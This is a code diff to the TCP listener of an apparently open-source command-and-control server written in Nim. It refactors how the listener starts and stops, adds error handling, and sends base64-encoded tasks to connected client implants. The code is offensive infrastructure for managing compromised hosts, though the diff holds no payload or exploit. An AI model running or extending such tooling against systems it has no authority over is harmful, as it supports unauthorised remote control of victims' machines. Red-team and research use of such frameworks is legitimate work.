@@ -1,14 +1,16 @@
-import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64, times
+import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64, times, tables
 
 import ../types, ../logging, ../processMessage, ../events
 
-proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: ref C2Client) {.async.} =
+proc processMessages(server: C2Server, tcpListener: TCPListener, tcpSocket: TCPSocket, client: ref C2Client) {.async.} =
   
   var msgS: string = ""
   var linesRecv: int = 0
-
-  while client.connected:
-    let line = await tcpSocket.socket.recvLine(maxLength=1000000)
+  var line: string = ""
+  while not tcpSocket.socket.isClosed:
+    try: 
+      line = await tcpSocket.socket.recvLine(maxLength=1000000)
+    except OSError: discard
 
     if line.len == 0:
       client.connected = false
@@ -18,14 +20,6 @@ proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: ref C2Clien
       continue
 
     inc linesRecv
-    # if linesRecv == 3:
-    #   client.connected = false
-    #   tcpSocket.socket.close()
-    #   cDisconnected(client[], "too much data sent")
-    #   for task in server.tasks:
-    #     if task.client == client[]:
-    #       task.markAsCompleted(%*{ "error": "client sent too much data" })
-    #   continue
 
     msgS &= line
 
@@ -47,7 +41,9 @@ proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: ref C2Clien
               "data": task.arguments
             }
         onClientCheckin(client[])  
-        await tcpSocket.socket.send(encode($j) & "\r\n")
+        try:
+          await tcpSocket.socket.send(encode($j) & "\r\n")
+        except OSError: discard
       continue
 
     msgS = ""
@@ -55,26 +51,36 @@ proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: ref C2Clien
 
     discard processMessage(client, response)
 
-proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.async.} =
-  let id = len(server.tcpListeners)
-  
+proc createNewTcpListener*(server: C2Server, instance: ListenerInstance) {.async.} =
+  let id = 1
+  let ipAddress = instance.ipAddress
+  let port = instance.port
+  let config = instance.config
+
   let tcpServer = TCPListener(
       sockets: @[], 
-      port: port,
-      listeningIP: ip,
+      port: int port,
+      listeningIP: ipAddress,
       id: id, 
       socket: newAsyncSocket(),
       running: true
     )
   try:
     tcpServer.socket.setSockOpt(OptReuseAddr, true)
-    tcpServer.socket.bindAddr(port.Port, ip)
+    tcpServer.socket.bindAddr(port, ipAddress)
     tcpServer.socket.listen()
   except OSError:
     errorLog getCurrentExceptionMsg()
     return
   
-  server.tcpListeners.add(tcpServer)
+  proc stop() =
+    for socket in tcpServer.sockets:
+      socket.socket.close()
+    # tcpServer.running = false
+    # tcpServer.socket.close()
+  instance.stopProc = stop
+
+  # server.tcpListeners.add(tcpServer)
   infoLog "listening on " & tcpServer.listeningIP & ":" & $tcpServer.port & " using a tcp socket"
   
   while tcpServer.running:
@@ -103,6 +109,11 @@ proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.a
     server.clients.add(client)
     tcpServer.sockets.add(tcpSocket)
 
-    asyncCheck processMessages(server, tcpSocket, cRef)
+    asyncCheck processMessages(server, tcpServer, tcpSocket, cRef)
 
   infoLog $tcpServer & " stopped"
+
+let listener* = Listener(
+  name: "tcp",
+  startProc: createNewTcpListener
+)
